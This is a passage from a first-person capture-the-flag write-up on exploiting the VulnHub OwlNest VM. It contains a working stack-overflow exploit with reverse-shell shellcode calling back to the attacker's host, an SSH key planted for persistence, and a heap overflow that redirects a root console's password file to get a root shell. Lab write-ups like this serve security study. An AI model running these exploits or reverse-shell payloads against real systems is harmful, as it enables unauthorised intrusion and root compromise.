0xbfa0d8d0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d8e0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d8f0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d900: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d910: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d920: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d930: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d940: 0x43434343  0x43434343  0x43434343  0x43434343
```

Hardcoding the stack address could work if ASLR was disabled on the server, but I had no way of knowing at the moment. A better solution was to find an instruction like CALL ESP or JMP ESP. Using msfelfscan to search for JMP ESP instructions, I found the following: 

```
root@kali ~/owlnest
# msfelfscan -j esp upload 
[upload]
0x080553a9 push esp; retn 0x83f0
0x08067701 push esp; ret
0x0806775f push esp; ret
0x080687d9 push esp; ret
0x080ab616 push esp; ret
0x080c75ab jmp esp
0x080c75bb jmp esp
0x080c75df jmp esp
0x080c75e3 jmp esp
0x080c7acf jmp esp
0x080c9a63 jmp esp
0x080ca7a8 jmp esp
```

I decided to pick the first JMP ESP at address 0x080c75ab. Writing the exploit from here on was relatively trivial. In the last test, the stack was filled with "C"s at the time I overwrote EIP, so I knew the shellcode would need to go after the return address. That is:

```
foo@[junk x 276][jmp esp][shellcode]
```

The shellcode would most likely need to be encoded, and since it was right at ESP, it would need some room to decode or it would definitely corrupt itself. To prevent this, I subtracted 123 bytes from the stack before the shellcode. So the final payload looked more like this: 

```
foo@[junk x 276][jmp esp][align stack][shellcode]
```

So putting it all together, this is what I ended up with: 

```python
#!/usr/bin/env python

from socket import *
from struct import pack
from random import *

# msfpayload linux/x86/shell_reverse_tcp LPORT=443 LHOST=172.16.229.129 R | msfencode -b "\x00\x0a\x0d\x20"
shellcode = (
"\xdb\xdf\xbe\xee\xf4\xe9\xf2\xd9\x74\x24\xf4\x5d\x29\xc9" +
"\xb1\x12\x31\x75\x17\x03\x75\x17\x83\x03\x08\x0b\x07\xea" +
"\x2a\x3b\x0b\x5f\x8e\x97\xa6\x5d\x99\xf9\x87\x07\x54\x79" +
"\x74\x9e\xd6\x45\xb6\xa0\x5e\xc3\xb1\xc8\xcc\x23\xa7\x89" +
"\x65\x46\x27\x88\xce\xcf\xc6\x3a\x56\x80\x59\x69\x24\x23" +
"\xd3\x6c\x87\xa4\xb1\x06\x37\x8a\x46\xbe\x2f\xfb\xca\x57" +
"\xde\x8a\xe8\xf5\x4d\x04\x0f\x49\x7a\xdb\x50"
)


ret = pack("<I", 0x080c75ab)        # jmp esp
align_stack = "\x90\x83\xc4\x85"    # add esp,-123

payload = "\x90"*276 + ret + align_stack + shellcode + "C"*200

request = (
"-----------------------------200953101619859560161384131169\r\n"
"Content-Disposition: form-data; name=\"name\"\r\n"
"\r\n"
"superkojiman\r\n"
"-----------------------------200953101619859560161384131169\r\n"
"Content-Disposition: form-data; name=\"email\"\r\n"
"\r\n"
"foo@" + payload + "\r\n"
"-----------------------------200953101619859560161384131169\r\n"
"Content-Disposition: form-data; name=\"description\"\r\n"
"\r\n"
"dummy text file\r\n"
"-----------------------------200953101619859560161384131169\r\n"
"Content-Disposition: form-data; name=\"uploadfield\"; filename=\"dummy2.txt\"\r\n"
"Content-Type: text/plain\r\n"
"\r\n"
"This is a dummy text file."
"Nothing to see here"
"\r\n"
"-----------------------------200953101619859560161384131169--\r\n"
)

print request
```

This script will create a new request file that should trigger the overflow and execute the shellcode. Note that I changed the filename to dummy2.txt since dummy.txt had already been uploaded earlier and uploading the same file would trigger an error. I started a netcat listener on port 443 and sent the exploit over to the target: 


```text
root@kali ~/owlnest
# curl -b "PHPSESSID=3cea38kfmr6c3dafmql6bu2lb0" -X POST -H "Content-Type: multipart/form-data; boundary=---------------------------200953101619859560161384131169" --data-binary @payload.txt http://172.16.229.164/application/upload
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator,
 webmaster@localhost and inform them of the time the error occurred,
and anything you might have done that may have
caused the error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 172.16.229.164 Port 80</address>
</body></html>
```

The upload binary on the server crashed, but looking over at the netcat listener showed that it had received a connection. The exploit worked and I had a shell!

```
root@kali ~/owlnest
# nc -lvp 443
nc: listening on :: 443 ...
nc: listening on 0.0.0.0 443 ...
nc: connect to 172.16.229.129 443 from 172.16.229.164 (172.16.229.164) 34997 [34997]
id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

I was now logged in as user rmp. To make the shell more pleasant to use, I copied over my SSH keys and logged in via SSH. 

```
cd /home/rmp
mkdir .ssh
chmod 700 .ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNwTWaRQSfRxx41tOsa+GNeU79GMTozHwt6bObAVTdlSs7Ur8pUIBvmEo7poA+iYbhXz3mVr02aFWtsGPSyt2ophkuje4UJj38gzHoju9nYxTJzT/cjaG7ljYnyv2LCug3Crw2HsDPqOCP5VqoCZPy7zNkWwO2H08yZkR/CyyNSu5YcOBccW6c/JD5h1wYlNFR5ukgMgW1KkQXDmI1ire/3Vpt9QtIwRpACbAGMA6obfASM3HxqmAyabn5tXBOcBofhN4MQF0GcwEef44EVAHN0rT4DMUDVmxf7ybBnq7yIY478kFkty7w1VFidisrmmblhqjxueQGcHVpvhNxqw63 root@kali.local" > .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
```

Having a proper shell made enumeration a lot easier. The first thing that stood out was a binary called adminconsole in /home/rmp. Running this returned some familiar ASCII faces:

```
rmp@owlnest:~$ ls -l
total 588
-rwx------ 1 rmp rmp 599275 Aug 11 13:35 adminconsole
rmp@owlnest:~$ ./adminconsole 
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: 
```

This was presumably the same service that was running on port 31337. It looked like it was being launched by xinetd whenever a connection to port 31337 was made, as noted in the /etc/xinetd.d/adminconsole file:

```
rmp@owlnest:/etc/xinetd.d$ cat adminconsole 
# default: on

service adminconsole
{
  port = 31337
  type = UNLISTED
  socket_type = stream
  wait = no
  user = root
  server = /home/rmp/adminconsole
  log_on_success += USERID PID HOST EXIT DURATION
  log_on_failure += USERID HOST ATTEMPT
  disable = no
}
```

More importantly, the service was running as root! If the service was executable, I could get a root shell. 

I ran strings on the binary and found some interesting information:

```
This is the OwlNest Administration console
Type Help for a list of available commands.
Syntax: command <argument>
help             This help
username         Specify your login name
password         Specify your password
privs    Specify your access level
login            login to shell with specified username and password
/root/password.txt
Unable to allocate buffer
Ready: 
help
privs 
password 
username 
/root/password.txt
login
Username or Password not set
Access Granted!
Dropping into /bin/sh
/bin/sh
Access Denied!
```

First, a file called /root/password.txt was being referenced. Presumably this contained the user credentials I needed to enter into the console. Second, the string "Dropping into /bin/sh" hinted that there was some way to drop into a shell from the console. Since the console was running as root, this would basically be a root shell. 

To better analyze the binary, I transferred it over to my machine and loaded it up into Hopper. I selected the main() function and decompiled it into the following:

```c
int main(int arg0, int arg1, int arg2, int arg3, int arg4, int arg5) {
    esp = (esp & 0xfffffff0) - 0xa0;
    printBanner();
    do {
            _IO_printf(STK37, STK36, STK35, STK34, STK33, "Ready: ");
            eax = *_IO_stdout;
            fflush(eax);
            eax = *_IO_stdin;
            eax = _IO_fgets(esp + 0x18, 0x80, eax);
            if (eax == 0x0) {
                break;
            }
            if (strncmp(esp + 0x18, 0x80abbf2, 0x4) == 0x0) {
                    printHelp();
            }
            if (strncmp(esp + 0x18, "privs ", 0x6) == 0x0) {
                    *privileges = strdup(0x6 + esp + 0x18);
            }
            if ((strncmp(esp + 0x18, "password ", 0x9) == 0x0) && (strlen(0x9 + esp + 0x18) <= 0x1e)) {
                    if (*auth != 0x0) {
                            strncpy(yourpassword, 0x9 + esp + 0x18, 0x1f);
                            *pwd = loadPasswordFromFile(STK37, STK36, STK35, STK34, STK33, *auth + 0x20);
                            eax = *pwd;
                            strncpy(password, eax, 0x1f);
                    }
            }
            if (strncmp(esp + 0x18, "username ", 0x9) == 0x0) {
                    *auth = __libc_malloc(STK37, STK36, STK35, STK34, STK33, 0x4);
                    eax = *auth;
                    memset(eax, 0x0, 0x4);
                    eax = *auth;
                    strncpy(eax + 0x20, "/root/password.txt", 0x1f);
            }
            if (strncmp(esp + 0x18, "login", 0x4) == 0x0) {
                    eax = *(int8_t *)yourpassword & 0xff;
                    if (LOBYTE(eax) != 0x0) {
                            eax = *(int8_t *)password & 0xff;
                            if (LOBYTE(eax) == 0x0) {
                                    eax = *_IO_stdout;
                                    fwrite("Username or Password not set\r\n", 0x1, 0x1e, eax);
                            }
                            else {
                                    eax = strtok(password, 0x80abad4);
                                    STK0 = strtok(STK1, eax);
                                    if (strncmp(STK2, STK1, STK0) == 0x0) {
                                            eax = *_IO_stdout;
                                            fwrite("Access Granted!\r\nDropping into /bin/sh\r\n", 0x1, 0x28, eax);
                                            eax = *_IO_stdout;
                                            fflush(eax);
                                            __libc_system("/bin/sh");
                                    }
                                    else {
                                            eax = *_IO_stdout;
                                            fwrite("Access Denied!\r\n", 0x1, 0x10, eax);
                                    }
                            }
                    }
                    else {
                            eax = *_IO_stdout;
                            fwrite("Username or Password not set\r\n", 0x1, 0x1e, eax);
                    }
            }
    } while (true);
    return eax;
}
```

Here's a summary of what the code does based on the command given to the console: 

* help: prints a help message. Nothing special here. 
* privs: copies the argument provided to privs into a buffer on the heap using strdup(). 
* password: copies the password provided into a buffer using strncpy() and then calls a function called loadPasswordFromFile() to get the saved password in /root/password.txt and saves that to another buffer. 
* username: this one is interesting in that it doesn't actually do anything with the username. Instead it simply copies the string "/root/password.txt" into a buffer on the heap. 
* login: this is where the magic happens. The password entered by the user is checked against the password loaded from /root/password.txt and if they match, the a call to system("/bin/sh") is made which gives the user a root shell. 

So the goal was to somehow get into the execution branch that triggered the call to system(). Of the function calls listed, strdup() was the only one that didn't do bounds checking. That meant it would be possible to use it to overwrite some other value that may exist in memory. To better understand this, I loaded up the binary in gdb. 

The call to strdup() occurs at offset 161 in main(): 

```text
0x08048656 <+149>:   jne    0x804866c <main+171>
0x08048658 <+151>:   lea    eax,[esp+0x18]
0x0804865c <+155>:   add    eax,0x6
0x0804865f <+158>:   mov    DWORD PTR [esp],eax
0x08048662 <+161>:   call   0x8056c80 <strdup>
0x08048667 <+166>:   mov    ds:0x80cc304,eax
0x0804866c <+171>:   mov    DWORD PTR [esp+0x8],0x9
0x08048674 <+179>:   mov    DWORD PTR [esp+0x4],0x80abbfe
0x0804867c <+187>:   lea    eax,[esp+0x18]
```

I set a breakpoint there and ran the binary. At the prompt, I entered the privs command followed by 40 "A"s: 

```
privs AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

I let execution continue and the program paused at the breakpoint. According to the man page for strdup(), it uses malloc() to allocate memory for the string to duplicate, and it returns a pointer to that allocated buffer. I stepped over the function call and checked the value in EAX. 

```
gdb-peda$ p $eax
$1 = 0x8fed6a8
```

This should be the address of the allocated buffer on the heap. Examining the contents of this buffer confirmed it: 

```
gdb-peda$ x/40wx 0x8fed6a0
0x8fed6a0:  0x00000000  0x00000031  0x41414141  0x41414141
0x8fed6b0:  0x41414141  0x41414141  0x41414141  0x41414141
0x8fed6c0:  0x41414141  0x41414141  0x41414141  0x41414141
0x8fed6d0:  0x0000000a  0x00020931  0x00000000  0x00000000
0x8fed6e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed6f0:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed700:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed710:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed720:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed730:  0x00000000  0x00000000  0x00000000  0x00000000
```

So I knew that I could probably use strdup() to overwrite something else on the heap, but what? It occured to me that the username command was writing the string "/root/password.txt" into the heap as well. Perhaps if I could overwrite that string to something else I had read access to, I could trick the binary into authenticating me. 

The strncpy() call that copies "/root/password.txt" occurs at offset 418 in main:

```
0x0804871a <+345>:   mov    DWORD PTR [esp],0x4
0x08048721 <+352>:   call   0x8055550 <malloc>
0x08048726 <+357>:   mov    ds:0x80cc2c0,eax
0x0804872b <+362>:   mov    eax,ds:0x80cc2c0
0x08048730 <+367>:   mov    DWORD PTR [esp+0x8],0x4
0x08048738 <+375>:   mov    DWORD PTR [esp+0x4],0x0
0x08048740 <+383>:   mov    DWORD PTR [esp],eax
0x08048743 <+386>:   call   0x8057cc0 <memset>
0x08048748 <+391>:   mov    eax,ds:0x80cc2c0
0x0804874d <+396>:   add    eax,0x20
0x08048750 <+399>:   mov    DWORD PTR [esp+0x8],0x1f
0x08048758 <+407>:   mov    DWORD PTR [esp+0x4],0x80abc12
0x08048760 <+415>:   mov    DWORD PTR [esp],eax
0x08048763 <+418>:   call   0x8056e30 <strncpy>
0x08048768 <+423>:   mov    DWORD PTR [esp+0x8],0x4
0x08048770 <+431>:   mov    DWORD PTR [esp+0x4],0x80abc26
```

I set a breakpoint here and allowed the program to continue executing. At the command prompt, I enetered a dummy username:

```
Ready: username foo
```

When the breakpoint got hit, I checked the arguments being passed into strncpy():

```
Guessed arguments:
arg[0]: 0x8fed6f8 --> 0x0 
arg[1]: 0x80abc12 ("/root/password.txt")
arg[2]: 0x1f 
```

This address wasn't too far from where the 40 "A"s were copied to in the heap by strdup(). Here's the heap before the strncpy():

```
gdb-peda$ x/40wx 0x8fed6a0
0x8fed6a0:  0x00000000  0x00000031  0x41414141  0x41414141
0x8fed6b0:  0x41414141  0x41414141  0x41414141  0x41414141
0x8fed6c0:  0x41414141  0x41414141  0x41414141  0x41414141
0x8fed6d0:  0x0000000a  0x00000011  0x00000000  0x00000000
0x8fed6e0:  0x00000000  0x00020921  0x00000000  0x00000000
0x8fed6f0:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed700:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed710:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed720:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed730:  0x00000000  0x00000000  0x00000000  0x00000000
```

And here it is again after I stepped over the strncpy() call: 

```
gdb-peda$ x/40wx 0x8fed6a0
0x8fed6a0:  0x00000000  0x00000031  0x41414141  0x41414141
0x8fed6b0:  0x41414141  0x41414141  0x41414141  0x41414141
0x8fed6c0:  0x41414141  0x41414141  0x41414141  0x41414141
0x8fed6d0:  0x0000000a  0x00000011  0x00000000  0x00000000
0x8fed6e0:  0x00000000  0x00020921  0x00000000  0x00000000
0x8fed6f0:  0x00000000  0x00000000  0x6f6f722f  0x61702f74
0x8fed700:  0x6f777373  0x742e6472  0x00007478  0x00000000
0x8fed710:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed720:  0x00000000  0x00000000  0x00000000  0x00000000
0x8fed730:  0x00000000  0x00000000  0x00000000  0x00000000
```

Based on this, it was looking like it was possible to overwrite the string "/root/password.txt" on the heap with whatever I wanted. One thing I had to do was change the order of the calls, so I had to issue the username command first to copy the string "/root/password.txt" into the heap, and then issue the privs command to overwrite it. 

I decided to overwrite /root/password.txt with the string "//tmp/password.txt". This kept the same length as the original string. After some trial and error, I found that I was able to trigger the overwrite by passing privs 16 "A"s, "//tmp/password, and a null byte. 

So stepping through it, I restarted the program and entered a dummy username first: 

```
Ready: username foo
```

I stepped over the call to strncpy() and checked the returned address in EAX. 

```
gdb-peda$ x/s 0x82006c8
0x82006c8:   "/root/password.txt"
```

As expected, the string had been copied into the heap. A quick look at the surrounding memory locations showed: 

```
gdb-peda$ x/40wx 0x82006a0
0x82006a0:  0x00000000  0x00000011  0x00000000  0x00000000
0x82006b0:  0x00000000  0x00020951  0x00000000  0x00000000
0x82006c0:  0x00000000  0x00000000  0x6f6f722f  0x61702f74
0x82006d0:  0x6f777373  0x742e6472  0x00007478  0x00000000
0x82006e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x82006f0:  0x00000000  0x00000000  0x00000000  0x00000000
0x8200700:  0x00000000  0x00000000  0x00000000  0x00000000
0x8200710:  0x00000000  0x00000000  0x00000000  0x00000000
0x8200720:  0x00000000  0x00000000  0x00000000  0x00000000
0x8200730:  0x00000000  0x00000000  0x00000000  0x00000000
```

Next I allowed the program to continue execution and when I got the prompt again, I used the following command for privs:

```
Ready: privs AAAAAAAAAAAAAAAA//tmp/password.txt^@
```

^@ is actually a null byte, since the string needs to be null terminated. This can be entered interactively on the terminal using the keyboard shortcut Ctrl-2. I stepped over the call to strdup() and examined the heap again. 

```
gdb-peda$ x/40wx 0x82006a0
0x82006a0:  0x00000000  0x00000011  0x00000000  0x00000000
0x82006b0:  0x00000000  0x00000029  0x41414141  0x41414141
0x82006c0:  0x41414141  0x41414141  0x6d742f2f  0x61702f70
0x82006d0:  0x6f777373  0x742e6472  0x00007478  0x00020929
0x82006e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x82006f0:  0x00000000  0x00000000  0x00000000  0x00000000
0x8200700:  0x00000000  0x00000000  0x00000000  0x00000000
0x8200710:  0x00000000  0x00000000  0x00000000  0x00000000
0x8200720:  0x00000000  0x00000000  0x00000000  0x00000000
0x8200730:  0x00000000  0x00000000  0x00000000  0x00000000
```

The original "/root/password.txt" looked like it had been successfully overwritten. Examining the memory address that initially held it showed that it had been overwritten to "//tmp/password.txt":

```
gdb-peda$ x/s 0x82006c8
0x82006c8:   "//tmp/password.txt"
```

Great! Now presumably if I issued the password command, it would call loadPasswordFromFile() and read from /tmp/password.txt. To understand what this function did, I once again decompiled it with Hopper:

```c
int loadPasswordFromFile(int arg0, int arg1, int arg2, int arg3, int arg4, int arg5) {
    var_10 = strtok(arg_0, 0x80abad4);
    var_C = __new_fopen(var_10, 0x80abbb8);
    if (var_C == 0x0) {
            var_C = __new_fopen("/root/password.txt", 0x80abbb8);
    }
    fseek(var_C, 0x0, 0x2);
    var_14 = ftell(var_C);
    fseek(var_C, 0x0, 0x0);
    var_18 = __libc_malloc(STK37, STK36, STK35, STK34, STK33, var_14 + 0x1);
    if (var_18 == 0x0) {
            eax = *_IO_stderr;
            eax = fwrite("Unable to allocate buffer\r\n", 0x1, 0x1b, eax);
    }
    else {
            fread(var_18, 0x1, var_14, var_C);
            __new_fclose(var_C);
            eax = var_18;
    }
    return eax;
}
```

So first it calls strtok() on the string located at 0x80abad4, which is actually "\r\n". That meant the file should contain a password on one line ending with CR/LF. With that in mind, I created /tmp/password.txt with the password "pwnd":

```text
root@kali ~/owlnest
# printf "pwnd\r\n" > /tmp/password.txt

root@kali ~/owlnest
# xxd -g1 /tmp/password.txt 
0000000: 70 77 6e 64 0d 0a                                pwnd..
```

I deleted the breakpoints and continued program execution and at the prompt, I entered:

```
Ready: password pwnd
```

At this point it should have loaded up the password from "/tmp/password.txt". I issued the login command next:

```
Ready: login
Access Granted!
Dropping into /bin/sh
[New process 10244]
process 10244 is executing new program: /bin/dash
[New process 10245]
process 10245 is executing new program: /bin/dash
# 
```

Fantastic! Only thing left to do was to try this out on the target itself. First, I copied /tmp/password.txt over to the target's /tmp directory, and then connected to adminconsole on port 31337

```
# nc -v 172.16.229.164 31337
nc: 172.16.229.164 (172.16.229.164) 31337 [31337] open
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: username foo
Ready: privs AAAAAAAAAAAAAAAA//tmp/password.txt^@
Ready: password pwnd
Ready: login
Access Granted!
Dropping into /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
```

Done and done! Dropped into a root shell, I could now read the contents of /root/flag.txt:

```
cat /root/flag.txt
               \ `-._......_.-` /
                `.  '.    .'  .'    Oh Well, in the end you did it!
                 //  _`\/`_  \\     You stopped the olws' evil plan  
                ||  /\O||O/\  ||    By pwning their secret base you
                |\  \_/||\_/  /|    saved the world!
                \ '.   \/   .' /    
                / ^ `'~  ~'`   \ 
               /  _-^_~ -^_ ~-  |
               | / ^_ -^_- ~_^\ |
               | |~_ ^- _-^_ -| |
               | \  ^-~_ ~-_^ / |
               \_/;-.,____,.-;\_/
        ==========(_(_(==)_)_)=========

The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4

Hope you enjoyed this vulnerable VM.
Looking forward to see a writeup from you soon!
don't forget to ping me on twitter with your thoughts

Sincerely
@Swappage


PS: why the owls? oh well, I really don't know and yes: i really suck at fictioning :p
True story is that i was looking for some ASCII art to place in the puzzles and owls popped out first
```

An excellent challenge! Thanks to Swappage and VulnHub for sharing this with everyone. I had moments of frustration but each step forward was a rush! 
